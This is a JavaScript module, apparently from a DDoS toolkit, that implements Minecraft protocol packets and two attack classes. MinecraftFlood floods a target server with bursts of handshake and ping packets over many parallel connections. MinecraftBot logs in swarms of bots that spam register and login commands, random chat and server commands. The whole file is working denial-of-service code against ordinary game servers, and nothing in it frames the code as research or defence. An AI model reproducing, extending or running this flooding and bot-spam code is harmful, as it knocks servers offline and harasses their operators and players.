import net from 'net';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';

/**
 * Minecraft Protocol Utilities
 */
class MinecraftProtocol {
    static varint(value) {
        const buffer = [];
        do {
            let byte = value & 0x7F;
            value >>>= 7;
            if (value !== 0) {
                byte |= 0x80;
            }
            buffer.push(byte);
        } while (value !== 0);
        return Buffer.from(buffer);
    }

    static data(...payloads) {
        const payload = Buffer.concat(payloads);
        return Buffer.concat([this.varint(payload.length), payload]);
    }

    static short(integer) {
        const buffer = Buffer.allocUnsafe(2);
        buffer.writeUInt16BE(integer, 0);
        return buffer;
    }

    static long(integer) {
        const buffer = Buffer.allocUnsafe(8);
        buffer.writeBigInt64BE(BigInt(integer), 0);
        return buffer;
    }

    static handshake(target, port, version, state) {
        return this.data(
            this.varint(0x00),
            this.varint(version),
            this.data(Buffer.from(target)),
            this.short(port),
            this.varint(state)
        );
    }

    static login(protocol, username) {
        const usernameBuffer = Buffer.from(username);
        return this.data(
            this.varint(protocol >= 391 ? 0x00 : protocol >= 385 ? 0x01 : 0x00),
            this.data(usernameBuffer)
        );
    }

    static keepalive(protocol, numId) {
        const packetId = protocol >= 755 ? 0x0F :
                        protocol >= 712 ? 0x10 :
                        protocol >= 471 ? 0x0F : 0x10;
        
        return this.data(
            this.varint(packetId),
            protocol >= 339 ? this.long(numId) : this.varint(numId)
        );
    }

    static chat(protocol, message) {
        const packetId = protocol >= 755 ? 0x03 :
                        protocol >= 464 ? 0x03 :
                        protocol >= 389 ? 0x02 : 0x01;
        
        return this.data(
            this.varint(packetId),
            this.data(Buffer.from(message))
        );
    }
}

/**
 * Minecraft Server Attack - IMPROVED AGGRESSIVE VERSION
 */
export class MinecraftFlood {
    constructor(target, port, duration, protocol = 47, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.protocol = protocol;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Create multiple connections simultaneously for more aggressive attack
            const connections = [];
            for (let i = 0; i < 10; i++) {
                connections.push(this.attack());
            }
            await Promise.allSettled(connections);
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(500); // Faster timeout
            socket.setNoDelay(true); // Disable Nagle's algorithm for faster sending

            const handshake = MinecraftProtocol.handshake(
                this.target,
                this.port,
                this.protocol,
                1
            );
            const ping = MinecraftProtocol.data(Buffer.from([0x00]));

            socket.connect(this.port, this.target, () => {
                let packetCount = 0;
                const maxPackets = 1000; // Send 1000 packets per connection

                const sendData = () => {
                    if (!this.active || packetCount >= maxPackets) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    // Send multiple packets at once for amplification
                    for (let i = 0; i < 50; i++) {
                        if (!this.active) break;
                        Tools.send(socket, handshake);
                        Tools.send(socket, ping);
                        // Send random handshakes with different versions to confuse server
                        const randomHandshake = MinecraftProtocol.handshake(
                            Tools.randomString(10) + '.' + this.target,
                            this.port,
                            Tools.randomInt(47, 763), // Random protocol versions
                            Tools.randomInt(1, 2)
                        );
                        Tools.send(socket, randomHandshake);
                        packetCount += 3;
                    }
                    
                    setImmediate(sendData);
                };

                sendData();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Minecraft Bot Attack (MCBOT) - IMPROVED AGGRESSIVE VERSION
 */
export class MinecraftBot {
    constructor(target, port, duration, protocol = 47, botPrefix = 'MHDDoS_') {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.protocol = protocol;
        this.botPrefix = botPrefix;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Spawn multiple bots simultaneously
            const bots = [];
            for (let i = 0; i < 5; i++) {
                bots.push(this.attack());
            }
            await Promise.allSettled(bots);
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.setNoDelay(true);

            const username = this.botPrefix + Tools.randomString(8);
            const password = Tools.randomString(12);

            const handshake = MinecraftProtocol.handshake(
                this.target,
                this.port,
                this.protocol,
                2
            );
            const login = MinecraftProtocol.login(this.protocol, username);

            socket.connect(this.port, this.target, async () => {
                Tools.send(socket, handshake);
                Tools.send(socket, login);

                await Tools.sleep(800); // Faster connection

                // Spam register/login commands
                for (let i = 0; i < 10; i++) {
                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/register ${password} ${password}`));
                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/login ${password}`));
                    Tools.send(socket, MinecraftProtocol.chat(this.protocol, `/register ${password}`));
                }

                let chatCount = 0;
                const maxChats = 500; // Send more messages

                const spamChat = () => {
                    if (!this.active || chatCount >= maxChats) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    // Send multiple messages at once
                    for (let i = 0; i < 20; i++) {
                        if (!this.active) break;
                        
                        // Random spam messages and commands
                        const messages = [
                            Tools.randomString(256),
                            `/help`,
                            `/list`,
                            `/msg @a ${Tools.randomString(100)}`,
                            `/tell @p ${Tools.randomString(100)}`,
                            `/say ${Tools.randomString(200)}`,
                            `/me ${Tools.randomString(150)}`,
                            Tools.randomString(256).repeat(3) // Extra long messages
                        ];
                        
                        const msg = Tools.randomChoice(messages);
                        Tools.send(socket, MinecraftProtocol.chat(this.protocol, msg));
                        
                        // Also send keep-alive packets to stay connected longer
                        Tools.send(socket, MinecraftProtocol.keepalive(this.protocol, Date.now()));
                        
                        chatCount++;
                    }

                    // Faster spam rate
                    setTimeout(spamChat, 200);
                };

                spamChat();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}
